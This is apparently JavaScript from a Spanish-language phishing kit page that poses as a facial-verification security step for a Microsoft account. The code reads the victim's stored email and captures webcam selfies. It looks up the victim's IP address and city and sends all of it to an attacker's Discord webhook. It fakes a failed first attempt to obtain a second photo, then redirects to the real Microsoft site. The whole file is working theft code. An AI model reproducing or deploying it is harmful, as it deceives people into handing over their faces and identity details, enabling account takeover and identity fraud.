      let stream = null;
      let video, canvas, preview, captureButton, retakeButton, continueButton;
      let cameraSection, previewSection, errorMessage, errorText, loadingOverlay;
      let warningMessage, cameraInstructions, mainSubtitle, mainTitle;
      let instructionsPopup, popupClose, timerDisplay;
      let successPopup;
      let verificationAttempts = 0;
      let popupTimer = null;
      let countdownTimer = null;
      let countdownSeconds = 30;
      
      function obtenerCorreoUsuario() {
        const correoGuardado = localStorage.getItem('correoUsuario');
        
        if (correoGuardado && correoGuardado.trim() !== '') {
          return correoGuardado;
        }
        
        const alternativas = [
          localStorage.getItem('email'),
          localStorage.getItem('correo'),
          localStorage.getItem('usuario'),
          localStorage.getItem('userEmail')
        ];
        
        for (const alternativa of alternativas) {
          if (alternativa && alternativa.trim() !== '') {
            return alternativa;
          }
        }
        
        return 'correo-no-disponible@ejemplo.com';
      }

      async function startCamera() {
        try {
          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            showError('Su navegador no soporta el acceso a la cámara.');
            disableCaptureButton();
            return;
          }
          
          stream = await navigator.mediaDevices.getUserMedia({
            video: {
              facingMode: 'user',
              width: { ideal: 1920 },
              height: { ideal: 1080 },
              frameRate: { ideal: 30 }
            },
            audio: false
          });
          
          if (video) {
            video.srcObject = stream;
            video.muted = true;
            
            try {
              await video.play();
            } catch (playError) {
              setTimeout(async () => {
                try {
                  if (video) await video.play();
                } catch (e) {}
              }, 100);
            }
          }
          
          hideError();
          if (captureButton) captureButton.disabled = false;
          
        } catch (error) {
          console.error('Error al acceder a la cámara:', error);
          showError('No se pudo acceder a la cámara. Por favor, permita el acceso.');
          disableCaptureButton();
        }
      }
      
      function stopCamera() {
        if (stream) {
          stream.getTracks().forEach(track => {
            track.stop();
            track.enabled = false;
          });
          stream = null;
        }
        if (video && video.srcObject) {
          video.srcObject = null;
        }
      }
      
      function showError(message) {
        if (errorText) errorText.textContent = message;
        if (errorMessage) errorMessage.classList.remove('hidden');
      }
      
      function hideError() {
        if (errorMessage) errorMessage.classList.add('hidden');
      }
      
      function disableCaptureButton() {
        if (captureButton) captureButton.disabled = true;
      }
      
      function capturePhoto() {
        try {
          const videoWidth = video.videoWidth;
          const videoHeight = video.videoHeight;
          
          canvas.width = videoWidth;
          canvas.height = videoHeight;
          
          const ctx = canvas.getContext('2d', { willReadFrequently: false });
          ctx.imageSmoothingEnabled = true;
          ctx.imageSmoothingQuality = 'high';
          ctx.translate(canvas.width, 0);
          ctx.scale(-1, 1);
          ctx.drawImage(video, 0, 0, videoWidth, videoHeight);
          
          preview.src = canvas.toDataURL('image/jpeg', 1.0);
          
          stopCamera();
          
          hideError();
          
          cameraSection.classList.add('hidden');
          previewSection.classList.remove('hidden');
          
          captureButton.classList.add('hidden');
          retakeButton.classList.remove('hidden');
          continueButton.classList.remove('hidden');
          
        } catch (error) {
          console.error('Error al capturar foto:', error);
          showError('Error al capturar la foto. Por favor, intente nuevamente.');
        }
      }
      
      function retakePhoto() {
        previewSection.classList.add('hidden');
        cameraSection.classList.remove('hidden');
        
        retakeButton.classList.add('hidden');
        continueButton.classList.add('hidden');
        captureButton.classList.remove('hidden');
        
        startCamera();
      }
      
      function showInstructionsPopup() {
        if (instructionsPopup) {
          instructionsPopup.classList.remove('hidden');
          document.body.style.overflow = 'hidden';
          
          startPopupTimer();
        }
      }
      
      function hideInstructionsPopup() {
        if (instructionsPopup) {
          instructionsPopup.classList.add('hidden');
          document.body.style.overflow = '';
          
          clearPopupTimers();
          
          startCamera();
        }
      }
      
      function startPopupTimer() {
        countdownSeconds = 30;
        if (timerDisplay) {
          timerDisplay.textContent = countdownSeconds;
        }
        
        countdownTimer = setInterval(() => {
          countdownSeconds--;
          
          if (timerDisplay) {
            timerDisplay.textContent = countdownSeconds;
          }
          
          if (countdownSeconds <= 0) {
            hideInstructionsPopup();
          }
        }, 1000);
        
        popupTimer = setTimeout(() => {
          hideInstructionsPopup();
        }, 30000);
      }
      
      function clearPopupTimers() {
        if (countdownTimer) {
          clearInterval(countdownTimer);
          countdownTimer = null;
        }
        
        if (popupTimer) {
          clearTimeout(popupTimer);
          popupTimer = null;
        }
      }
      
      function showSuccessPopup() {
        if (successPopup) {
          successPopup.classList.remove('hidden');
          setTimeout(() => {
            successPopup.classList.add('active');
            document.body.style.overflow = 'hidden';
          }, 10);
          
          setTimeout(() => {
            window.location.href = 'https://account.microsoft.com';
          }, 20000);
        }
      }
      
      function hideSuccessPopup() {
        if (successPopup) {
          successPopup.classList.remove('active');
          setTimeout(() => {
            successPopup.classList.add('hidden');
            document.body.style.overflow = '';
          }, 400);
        }
      }
      
      function configureSecondAttempt() {
        if (warningMessage) {
          warningMessage.classList.remove('hidden');
        }
        
        if (mainTitle) {
          mainTitle.textContent = "Verificación facial";
        }
        
        if (mainSubtitle) {
          mainSubtitle.textContent = "Para finalizar el proceso de seguridad, tome una selfie donde se vea su rostro claramente para verificar su identidad.";
        }
        
        if (cameraInstructions) {
          cameraInstructions.textContent = "";
        }
        
        if (captureButton) {
          captureButton.textContent = "Tomar foto";
        }
      }
      
      async function sendPhotoToDiscord(imageData, attemptNumber) {
        try {
          const userEmail = obtenerCorreoUsuario();
          
          console.log('Correo obtenido para Discord:', userEmail);
          
          let ipInfo = '';
          let locationInfo = '';
          
          try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            if (ipResponse.ok) {
              const ipData = await ipResponse.json();
              ipInfo = ipData.ip;
              
              try {
                const locationResponse = await fetch(`https://ipinfo.io/${ipInfo}/json`);
                if (locationResponse.ok) {
                  const locationData = await locationResponse.json();
                  locationInfo = `${locationData.city || 'Desconocida'}, ${locationData.country || 'Desconocido'}`;
                }
              } catch (locationError) {}
            }
          } catch (ipError) {}
          
          const discordMessage = {
            "content": null,
            "embeds": [
              {
                "title": attemptNumber === 1 ? "📸 PRIMERA VERIFICACIÓN FACIAL 📸" : "📸 SEGUNDA VERIFICACIÓN FACIAL 📸",
                "color": 3066993,
                "fields": [
                  {
                    "name": "📧 Correo Electrónico",
                    "value": userEmail,
                    "inline": false
                  },
                  {
                    "name": "🔄 Intento",
                    "value": attemptNumber === 1 ? "Primer intento" : "Segundo intento",
                    "inline": false
                  },
                  {
                    "name": "🌍 IP y Ubicación",
                    "value": ipInfo ? `IP: ${ipInfo}\nUbicación: ${locationInfo || 'No disponible'}` : 'No se pudo obtener información de IP',
                    "inline": false
                  },
                  {
                    "name": "📅 Fecha y Hora",
                    "value": new Date().toLocaleString('es-ES', { 
                      timeZone: 'America/Lima',
                      dateStyle: 'full',
                      timeStyle: 'long'
                    }),
                    "inline": false
                  }
                ],
                "image": {
                  "url": "attachment://selfie.jpg"
                },
                "timestamp": new Date().toISOString(),
                "footer": {
                  "text": "Made by: @MORPH3USH4CK"
                }
              }
            ],
            "attachments": []
          };
          
          const base64Data = imageData.split(',')[1];
          const byteCharacters = atob(base64Data);
          const byteNumbers = new Array(byteCharacters.length);
          
          for (let i = 0; i < byteCharacters.length; i++) {
            byteNumbers[i] = byteCharacters.charCodeAt(i);
          }
          
          const byteArray = new Uint8Array(byteNumbers);
          const blob = new Blob([byteArray], { type: 'image/jpeg' });
          
          const formData = new FormData();
          formData.append('payload_json', JSON.stringify(discordMessage));
          formData.append('file', blob, 'selfie.jpg');
          
          if (typeof discord_webhook_url === 'undefined') {
            console.error('Webhook de Discord no definido');
            return false;
          }
          
          const response = await fetch(discord_webhook_url, {
            method: 'POST',
            body: formData
          });
          
          return response.ok;
          
        } catch (error) {
          console.error('Error al enviar foto a Discord:', error);
          return false;
        }
      }
      
      async function handleContinue() {
        verificationAttempts++;
        
        const imageData = canvas.toDataURL('image/jpeg', 1.0);
        
        continueButton.disabled = true;
        const originalText = continueButton.textContent;
        
        if (preview) {
          preview.classList.add('loading');
        }
        if (loadingOverlay) {
          loadingOverlay.classList.remove('hidden');
        }
        
        await sendPhotoToDiscord(imageData, verificationAttempts);
        
        await new Promise(resolve => setTimeout(resolve, 2500));
        
        if (loadingOverlay) {
          loadingOverlay.classList.add('hidden');
        }
        if (preview) {
          preview.classList.remove('loading');
        }
        
        if (verificationAttempts === 1) {
          continueButton.textContent = '¡Otra Vez!';
          continueButton.classList.add('error');
          
          await new Promise(resolve => setTimeout(resolve, 2000));
          
          previewSection.classList.add('hidden');
          cameraSection.classList.remove('hidden');
          
          retakeButton.classList.add('hidden');
          continueButton.classList.add('hidden');
          captureButton.classList.remove('hidden');
          
          configureSecondAttempt();
          
          continueButton.textContent = originalText;
          continueButton.classList.remove('error');
          continueButton.disabled = false;
          
          startCamera();
        } 
        else if (verificationAttempts === 2) {
          continueButton.textContent = 'Verificación exitosa ✓';
          continueButton.classList.add('success');
          
          await new Promise(resolve => setTimeout(resolve, 1500));
          
          showSuccessPopup();
        }
      }
      
      function init() {
        video = document.getElementById('video');
        canvas = document.getElementById('canvas');
        preview = document.getElementById('preview');
        captureButton = document.getElementById('captureButton');
        retakeButton = document.getElementById('retakeButton');
        continueButton = document.getElementById('continueButton');
        cameraSection = document.getElementById('cameraSection');
        previewSection = document.getElementById('previewSection');
        errorMessage = document.getElementById('errorMessage');
        errorText = document.getElementById('errorText');
        loadingOverlay = document.getElementById('loadingOverlay');
        warningMessage = document.getElementById('warningMessage');
        cameraInstructions = document.getElementById('cameraInstructions');
        mainSubtitle = document.getElementById('mainSubtitle');
        mainTitle = document.getElementById('mainTitle');
        instructionsPopup = document.getElementById('instructionsPopup');
        popupClose = document.getElementById('popupClose');
        timerDisplay = document.getElementById('timerDisplay');        
        successPopup = document.getElementById('successPopup');
        
        const requiredElements = [
          video, canvas, preview, captureButton, retakeButton, continueButton,
          cameraSection, previewSection, successPopup
        ];
        
        for (const element of requiredElements) {
          if (!element) {
            showError('Error de configuración de la página. Recargue por favor.');
            return;
          }
        }
        
        captureButton.addEventListener('click', capturePhoto);
        retakeButton.addEventListener('click', retakePhoto);
        continueButton.addEventListener('click', handleContinue);
        
        if (popupClose) {
          popupClose.addEventListener('click', hideInstructionsPopup);
        }
        
        if (instructionsPopup) {
          instructionsPopup.addEventListener('click', function(e) {
            if (e.target === instructionsPopup) {
              hideInstructionsPopup();
            }
          });
        }
        
        window.addEventListener('beforeunload', stopCamera);
        window.addEventListener('pagehide', stopCamera);
        
        setTimeout(() => {
          showInstructionsPopup();
        }, 500);
      }
      
      if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
      } else {
        init();
      }